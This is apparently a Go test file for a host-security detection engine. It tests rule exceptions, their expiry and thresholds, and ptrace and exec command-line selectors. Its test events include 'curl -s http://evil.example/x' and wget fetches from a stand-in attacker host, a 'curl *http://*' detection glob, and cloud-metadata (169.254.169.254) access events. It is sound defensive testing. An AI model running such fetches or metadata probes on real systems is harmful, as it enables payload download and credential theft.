package detection

import (
	"strings"
	"testing"
	"time"

	"github.com/L1ghtn1ng/traceguard/internal/policy"
)

func metadataEvent(at int64, uid uint32) Event {
	return Event{
		Timestamp: time.Unix(at, 0),
		Name:      "connection",
		Fields: map[string]any{
			"direction": "outbound", "peer_address": "169.254.169.254", "peer_port": uint16(80),
			"protocol": "tcp", "kernel_uid": uid, "cgroup_id": uint64(uid), "program": "agent",
		},
	}
}

func metadataException(expires time.Time) policy.DetectionException {
	return policy.DetectionException{
		ID: "guest-agent-imds", Rules: []string{"baseline.cloud-metadata-access"},
		Reason: "guest agent polls instance metadata", Expires: policy.Timestamp{Time: expires},
		Match: policy.DetectionMatch{UIDs: []uint32{0}, Directions: []string{"outbound"}},
	}
}

func installExceptions(t *testing.T, exceptions ...policy.DetectionException) *Engine {
	t.Helper()
	engine, err := New(nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	compiled, err := Compile(policy.Bundle{DisabledRuleIDs: []string{"baseline.direct-email-egress", "baseline.policy-denial-burst"}, DetectionExceptions: exceptions})
	if err != nil {
		t.Fatalf("Compile returned error: %v", err)
	}
	engine.Install(compiled)
	return engine
}

func TestExceptionSuppressesMatchingEventsUntilExpiry(t *testing.T) {
	t.Parallel()

	engine := installExceptions(t, metadataException(time.Unix(100, 0)))
	if alerts := engine.Evaluate(metadataEvent(10, 0)); len(alerts) != 0 {
		t.Fatalf("excepted event raised %d alerts", len(alerts))
	}
	if alerts := engine.Evaluate(metadataEvent(11, 1000)); len(alerts) != 1 {
		t.Fatalf("event outside the exception raised %d alerts, want 1", len(alerts))
	}
	if alerts := engine.Evaluate(metadataEvent(100, 0)); len(alerts) != 1 {
		t.Fatalf("event at expiry raised %d alerts, want 1", len(alerts))
	}

	statuses := engine.ExceptionStatus(time.Unix(50, 0))
	if len(statuses) != 1 || statuses[0].ID != "guest-agent-imds" || statuses[0].Expired || statuses[0].Suppressed != 1 {
		t.Fatalf("status before expiry = %+v", statuses)
	}
	if statuses := engine.ExceptionStatus(time.Unix(100, 0)); !statuses[0].Expired {
		t.Fatalf("status at expiry = %+v, want expired", statuses)
	}
}

func TestExceptionWithoutExpiryNeverExpires(t *testing.T) {
	t.Parallel()

	engine := installExceptions(t, metadataException(time.Time{}))
	if alerts := engine.Evaluate(metadataEvent(1<<40, 0)); len(alerts) != 0 {
		t.Fatalf("non-expiring exception let %d alerts through", len(alerts))
	}
	if statuses := engine.ExceptionStatus(time.Unix(1<<40, 0)); statuses[0].Expired {
		t.Fatal("exception without expires reported expired")
	}
}

func TestExceptedEventsDoNotCountTowardThresholds(t *testing.T) {
	t.Parallel()

	rule := policy.DetectionRule{
		ID: "outbound-burst", Severity: "warning", Events: []string{"connection"},
		Match:     policy.DetectionMatch{Directions: []string{"outbound"}},
		Threshold: policy.Threshold{Count: 2, Within: policy.Duration{Duration: time.Minute}, GroupBy: []string{"destination"}},
		Message:   "burst",
	}
	exception := policy.DetectionException{
		ID: "root-burst", Rules: []string{"outbound-burst"}, Reason: "root is expected",
		Match: policy.DetectionMatch{UIDs: []uint32{0}},
	}
	compiled, err := Compile(policy.Bundle{DetectionRules: []policy.DetectionRule{rule}, DisabledRuleIDs: []string{"baseline.cloud-metadata-access"}, DetectionExceptions: []policy.DetectionException{exception}})
	if err != nil {
		t.Fatal(err)
	}
	engine, err := New(nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	engine.Install(compiled)
	engine.Evaluate(metadataEvent(1, 0))
	if alerts := engine.Evaluate(metadataEvent(2, 1000)); len(alerts) != 0 {
		t.Fatalf("excepted event counted toward the threshold: %d alerts", len(alerts))
	}
	if alerts := engine.Evaluate(metadataEvent(3, 1000)); len(alerts) != 1 {
		t.Fatalf("second non-excepted event raised %d alerts, want 1", len(alerts))
	}
}

func TestInstallKeepsSuppressionCountsForRetainedExceptions(t *testing.T) {
	t.Parallel()

	engine := installExceptions(t, metadataException(time.Time{}))
	engine.Evaluate(metadataEvent(1, 0))
	engine.Evaluate(metadataEvent(2, 0))

	compiled, err := Compile(policy.Bundle{DetectionExceptions: []policy.DetectionException{metadataException(time.Time{})}})
	if err != nil {
		t.Fatal(err)
	}
	engine.Install(compiled)
	if statuses := engine.ExceptionStatus(time.Unix(3, 0)); statuses[0].Suppressed != 2 {
		t.Fatalf("suppressed after reinstall = %d, want 2", statuses[0].Suppressed)
	}
	engine.Install(CompiledRules{})
	if statuses := engine.ExceptionStatus(time.Unix(3, 0)); len(statuses) != 0 {
		t.Fatalf("removed exception still reported: %+v", statuses)
	}
}

func TestCompileRejectsInvalidExceptionReferences(t *testing.T) {
	t.Parallel()

	unknown := metadataException(time.Time{})
	unknown.Rules = []string{"no-such-rule"}
	if _, err := Compile(policy.Bundle{DetectionExceptions: []policy.DetectionException{unknown}}); err == nil || !strings.Contains(err.Error(), "unknown rule") {
		t.Fatalf("unknown rule error = %v", err)
	}

	disabled := metadataException(time.Time{})
	if _, err := Compile(policy.Bundle{DisabledRuleIDs: []string{"baseline.cloud-metadata-access"}, DetectionExceptions: []policy.DetectionException{disabled}}); err != nil {
		t.Fatalf("exception for a disabled rule returned error: %v", err)
	}

	// DNS events carry no event-time process identity, so a UID exception on
	// a DNS rule could never be evaluated truthfully.
	dnsRule := policy.DetectionRule{
		ID: "dns-watch", Severity: "notice", Events: []string{"dns"}, Message: "dns",
		Match: policy.DetectionMatch{Domains: []string{"example.com"}},
	}
	byUID := policy.DetectionException{
		ID: "dns-root", Rules: []string{"dns-watch"}, Reason: "root lookups",
		Match: policy.DetectionMatch{UIDs: []uint32{0}},
	}
	if _, err := Compile(policy.Bundle{DetectionRules: []policy.DetectionRule{dnsRule}, DetectionExceptions: []policy.DetectionException{byUID}}); err == nil || !strings.Contains(err.Error(), "event-time process identity") {
		t.Fatalf("identity exception on DNS rule error = %v", err)
	}
}

func TestOperationsSelectorMatchesEventOperation(t *testing.T) {
	t.Parallel()

	compiled, err := Compile(policy.Bundle{DetectionRules: []policy.DetectionRule{{
		ID: "ptrace-attach", Severity: "warning", Events: []string{"ptrace"}, Message: "attach",
		Match: policy.DetectionMatch{Operations: []string{"attach", "seize"}},
	}}, DisabledRuleIDs: []string{"baseline.cloud-metadata-access", "baseline.direct-email-egress", "baseline.inbound-ssh-bruteforce", "baseline.policy-denial-burst"}})
	if err != nil {
		t.Fatal(err)
	}
	engine, err := New(nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	engine.Install(compiled)
	event := func(operation string) Event {
		return Event{Timestamp: time.Unix(1, 0), Name: "ptrace", Fields: map[string]any{"operation": operation}}
	}
	if alerts := engine.Evaluate(event("seize")); len(alerts) != 1 {
		t.Fatalf("seize raised %d alerts, want 1", len(alerts))
	}
	if alerts := engine.Evaluate(event("traceme")); len(alerts) != 0 {
		t.Fatalf("traceme raised %d alerts, want 0", len(alerts))
	}
}

func TestExecSelectorsMatchCommandLineAndSource(t *testing.T) {
	t.Parallel()

	compiled, err := Compile(policy.Bundle{DetectionRules: []policy.DetectionRule{{
		ID: "fd-curl", Severity: "warning", Events: []string{"exec"}, Message: "fd curl",
		Match: policy.DetectionMatch{CommandGlobs: []string{"curl *http://*"}, ExecSources: []string{"fd"}},
	}}, DisabledRuleIDs: []string{"baseline.cloud-metadata-access", "baseline.direct-email-egress", "baseline.inbound-ssh-bruteforce", "baseline.policy-denial-burst"}})
	if err != nil {
		t.Fatal(err)
	}
	engine, err := New(nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	engine.Install(compiled)
	exec := func(args any, source string) int {
		return len(engine.Evaluate(Event{Timestamp: time.Unix(1, 0), Name: "exec", Fields: map[string]any{
			"command_line": args, "exec_source": source,
		}}))
	}
	if got := exec([]string{"curl", "-s", "http://evil.example/x"}, "fd"); got != 1 {
		t.Fatalf("live command line alerts = %d, want 1", got)
	}
	if got := exec([]any{"curl", "-s", "http://evil.example/x"}, "fd"); got != 1 {
		t.Fatalf("replayed command line alerts = %d, want 1", got)
	}
	if got := exec([]string{"curl", "-s", "http://evil.example/x"}, "path"); got != 0 {
		t.Fatalf("path exec alerts = %d, want 0", got)
	}
	if got := exec([]string{"wget", "http://evil.example/x"}, "fd"); got != 0 {
		t.Fatalf("other command alerts = %d, want 0", got)
	}
}
